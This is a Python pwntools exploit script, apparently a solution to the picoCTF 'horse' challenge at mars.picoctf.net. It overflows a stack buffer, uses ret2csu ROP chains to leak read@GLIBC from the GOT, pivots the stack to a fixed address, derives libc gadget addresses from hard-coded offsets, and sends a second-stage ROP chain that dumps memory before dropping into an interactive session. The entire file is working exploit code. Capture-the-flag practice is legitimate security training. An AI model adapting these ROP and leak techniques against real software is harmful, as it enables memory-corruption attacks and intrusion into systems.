from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0
leave_ret = 0x400b96 

def leak_read():
    heap_stack = 0x602500
    
    payload = b'A' * 32
    payload += b'B' * 8 
    
    # Chain 1: Write got_read
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    # Chain 2: Read(0, heap_stack, 0x500)
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_read) + p64(0) + p64(heap_stack) + p64(0x500)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    # Chain 3: Pivot
    payload += p64(csu_pop)
    payload += p64(0) 
    payload += p64(heap_stack) 
    payload += p64(0) * 4 
    payload += p64(leave_ret) 

    log.info("Sending Chain payload...")
    r.sendline(payload)
    
    r.recvuntil(b'/     /   \xc2\xb4\n')
    
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        log.success(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except Exception as e:
        log.error(f"Failed to receive leak: {e}")
        exit()

leaked_read = leak_read()

# Offsets 0ubuntu9
off_read_9 = 0x110fa0
off_write_9 = 0x111040
off_pop_rdi_9 = 0x26b72
off_pop_rsi_9 = 0x27529
off_pop_rdx_9 = 0x11c1e1

# Uniform Shift Assumption
# addr = leak - off_read_9 + off_gadget_9

addr_write = leaked_read - off_read_9 + off_write_9
gadget_pop_rdi = leaked_read - off_read_9 + off_pop_rdi_9
gadget_pop_rsi = leaked_read - off_read_9 + off_pop_rsi_9
gadget_pop_rdx = leaked_read - off_read_9 + off_pop_rdx_9

# Stage 2 ROP (at 0x602500)
payload2 = b'J' * 8 # saved rbp

# write(1, leaked_read, 0x100)
payload2 += p64(gadget_pop_rdi) + p64(1)
payload2 += p64(gadget_pop_rsi) + p64(leaked_read)
payload2 += p64(gadget_pop_rdx) + p64(0x100) + p64(0) 
payload2 += p64(addr_write)

log.info("Sending Stage 2 payload (DUMP)...")
time.sleep(0.5)
r.sendline(payload2)

# Receive dump
try:
    dump = r.recvn(0x100)
    log.info("Dump received")
    print(hexdump(dump))
except Exception as e:
    log.error(f"Failed dump: {e}")

r.interactive()
